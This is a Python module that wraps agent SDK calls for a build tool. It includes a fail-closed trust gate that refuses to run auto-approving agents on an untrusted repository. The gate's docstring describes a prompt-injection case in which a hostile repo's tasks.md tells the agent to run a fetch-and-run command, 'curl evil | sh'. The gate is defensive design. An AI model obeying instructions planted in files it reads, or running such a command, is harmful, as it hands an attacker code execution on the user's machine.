"""SDK wrapper for LLM calls — single-turn and multi-turn with file tools.

Three call patterns:
- llm_call(): Single-turn, no tools, returns text. For reviews, rubric scoring, etc.
- agent_call(): Multi-turn with file tools, returns AgentResult. For TDD agents.
- llm_call_structured(): Single-turn, returns Pydantic model. For structured output.

The SDK machinery (isolation flags, hard timeout, stderr capture, big-prompt
tempfile fallback, unknown-message skip) lives in multiplai_core.agent_runner —
this module keeps only what is buildme-specific: the repo trust gate, the
AgentResult mapping (including degrade-to-partial-output on failure), the
concurrency semaphore, structured-output validation, and the LLMCallError
taxonomy.
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import time
from typing import TypeVar

from pydantic import BaseModel, ValidationError

from multiplai_core.agent_runner import (
    MAX_PROMPT_BYTES,  # noqa: F401 — re-exported (E2BIG threshold lives in core now)
    AgentRunError,
    AgentRunTimeout,
    run_agent,
)
from multiplai_core.aio import hard_timeout, swallow_task_result as _swallow_task_result  # noqa: F401
from multiplai_core.text import extract_json  # noqa: F401

from .models import AgentResult

log = logging.getLogger(__name__)

T = TypeVar("T", bound=BaseModel)

DEFAULT_LLM_CALL_TIMEOUT_S = 600.0
DEFAULT_AGENT_CALL_TIMEOUT_S = 1800.0  # 30 min for implementation agents
MAX_CONCURRENT_SDK_CALLS = 10

_sdk_semaphore: asyncio.Semaphore | None = None


def _get_semaphore() -> asyncio.Semaphore:
    global _sdk_semaphore
    if _sdk_semaphore is None:
        _sdk_semaphore = asyncio.Semaphore(MAX_CONCURRENT_SDK_CALLS)
    return _sdk_semaphore


def _require_sdk() -> None:
    """Fail with the buildme error taxonomy when the SDK is absent."""
    try:
        import claude_agent_sdk  # noqa: F401
    except ImportError as e:
        raise LLMCallError("claude-agent-sdk not installed") from e


class LLMCallError(Exception):
    """Raised when an LLM call fails beyond retry."""


class LLMCallTimeoutError(LLMCallError):
    """Raised when an LLM call exceeds its timeout."""


class RepoTrustError(LLMCallError):
    """Raised when an agent would run tools in bypassPermissions mode against a
    repository the user has not explicitly marked as trusted."""


def _repo_is_trusted() -> bool:
    """Whether the user has opted into running unattended, auto-approving agents
    against the target repo.

    buildme's implementation/refactor/apply agents run with
    permission_mode="bypassPermissions" and their prompts are assembled from the
    repo's own specs/ (design.md, tasks.md, config.yaml). Pointed at a hostile
    repo, a `tasks.md` that says "first run `curl evil | sh`" becomes code
    execution as the user (CWE-94). We therefore require an explicit opt-in —
    the `--trust-repo` flag or BUILDME_TRUST_REPO=1 — before any such agent runs.
    """
    return os.environ.get("BUILDME_TRUST_REPO", "").strip().lower() in ("1", "true", "yes")


async def llm_call(
    prompt: str,
    *,
    model: str | None = None,
    max_turns: int = 1,
    system_prompt: str | None = None,
    allowed_tools: list[str] | None = None,
    call_timeout: float = DEFAULT_LLM_CALL_TIMEOUT_S,
) -> str:
    """Single-turn LLM call. Returns text response. No tools by default."""
    _require_sdk()

    log.info("START sdk_call=llm prompt_bytes=%d model=%s timeout=%.0fs",
             len(prompt.encode("utf-8")), model or "default", call_timeout)
    async with _get_semaphore():
        try:
            result = await run_agent(
                prompt,
                system_prompt=system_prompt,
                allowed_tools=allowed_tools,
                max_turns=max_turns,
                model=model,
                timeout_s=call_timeout,
                label="llm",
                component="buildme",
            )
        except AgentRunTimeout as e:
            log.error("FAIL sdk_call=llm reason=timeout after %.0fs\n--- CLI stderr ---\n%s",
                      call_timeout, e.stderr_tail)
            raise LLMCallTimeoutError(
                f"LLM call exceeded {call_timeout:.0f}s timeout"
            ) from e
        except AgentRunError as e:
            log.error("FAIL sdk_call=llm error=%s\n--- CLI stderr ---\n%s",
                      e.reason, e.stderr_tail)
            raise LLMCallError(
                f"SDK query failed: {e.reason}\n--- CLI stderr ---\n{e.stderr_tail}"
            ) from e

    log.info("DONE sdk_call=llm result_chars=%d", len(result.text))
    return result.text


async def agent_call(
    prompt: str,
    *,
    allowed_tools: list[str],
    model: str | None = None,
    max_turns: int = 50,
    cwd: str | None = None,
    call_timeout: float = DEFAULT_AGENT_CALL_TIMEOUT_S,
) -> AgentResult:
    """Multi-turn agent call with file tools. For TDD agents.

    The agent can read/write files, run commands, and iterate until done.
    Returns AgentResult with success status, output, and file changes.
    """
    _require_sdk()

    # Fail closed: these agents auto-approve every tool call (bypassPermissions)
    # and act on instructions drawn from the target repo's specs/. Refuse unless
    # the user has explicitly vouched for the repo.
    if not _repo_is_trusted():
        raise RepoTrustError(
            "buildme runs its implementation agents with auto-approved tool access "
            "(bypassPermissions), executing steps described in this repo's specs/ "
            "(design.md, tasks.md, config.yaml). Only proceed on a repository you "
            "trust — a hostile repo can turn those files into arbitrary command "
            "execution as you.\n"
            "If you authored / trust this repo, re-run with --trust-repo "
            "(or set BUILDME_TRUST_REPO=1)."
        )

    log.info("START sdk_call=agent tools=%s model=%s max_turns=%d timeout=%.0fs",
             allowed_tools, model or "default", max_turns, call_timeout)
    start = time.monotonic()

    async with _get_semaphore():
        try:
            result = await run_agent(
                prompt,
                allowed_tools=allowed_tools,
                max_turns=max_turns,
                model=model,
                cwd=cwd,  # None → run_agent's isolated hook-sessions dir
                timeout_s=call_timeout,
                label="agent",
                component="buildme",
            )
        except AgentRunError as e:
            # Degrade to partial output instead of raising — the TDD engine
            # decides whether a failed agent aborts the block or retries.
            elapsed = time.monotonic() - start
            partial = e.partial
            timed_out = isinstance(e, AgentRunTimeout)
            log.error("FAIL sdk_call=agent reason=%s elapsed=%.0fs turns=%d\n--- CLI stderr ---\n%s",
                      "timeout" if timed_out else e.reason, elapsed,
                      partial.turns if partial else 0, e.stderr_tail)
            error_msg = (
                f"Agent timed out after {elapsed:.0f}s\nCLI stderr:\n{e.stderr_tail}"
                if timed_out
                else f"{e.reason}\nCLI stderr:\n{e.stderr_tail}"
            )
            return AgentResult(
                success=False,
                output=partial.text if partial else "",
                error=error_msg,
                timed_out=timed_out,
                turns_used=partial.turns if partial else 0,
                elapsed_seconds=elapsed,
                files_changed=partial.files_changed if partial else [],
            )

    elapsed = time.monotonic() - start
    log.info("DONE sdk_call=agent turns=%d elapsed=%.0fs files_changed=%d",
             result.turns, elapsed, len(result.files_changed))
    return AgentResult(
        success=True,
        output=result.text,
        turns_used=result.turns,
        elapsed_seconds=elapsed,
        files_changed=result.files_changed,
    )


async def llm_call_structured(
    prompt: str,
    schema: type[T],
    *,
    model: str | None = None,
    max_retries: int = 1,
    system_prompt: str | None = None,
    call_timeout: float = DEFAULT_LLM_CALL_TIMEOUT_S,
) -> T:
    """LLM call with Pydantic-validated structured output."""
    current_prompt = prompt
    last_error: Exception | None = None

    for attempt in range(max_retries + 1):
        raw = await llm_call(current_prompt, model=model, system_prompt=system_prompt, call_timeout=call_timeout)
        try:
            payload = extract_json(raw)
            return schema.model_validate(payload)
        except (ValidationError, ValueError, json.JSONDecodeError) as e:
            last_error = e
            log.warning("Structured output validation failed (attempt %d/%d): %s", attempt + 1, max_retries + 1, e)
            if attempt < max_retries:
                current_prompt = (
                    f"{prompt}\n\n---\n"
                    f"Previous response failed validation: {e}\n"
                    f"Return ONLY valid JSON matching this schema:\n"
                    f"{json.dumps(schema.model_json_schema(), indent=2)}\n"
                )

    raise LLMCallError(f"Structured output validation failed after {max_retries + 1} attempts: {last_error}")
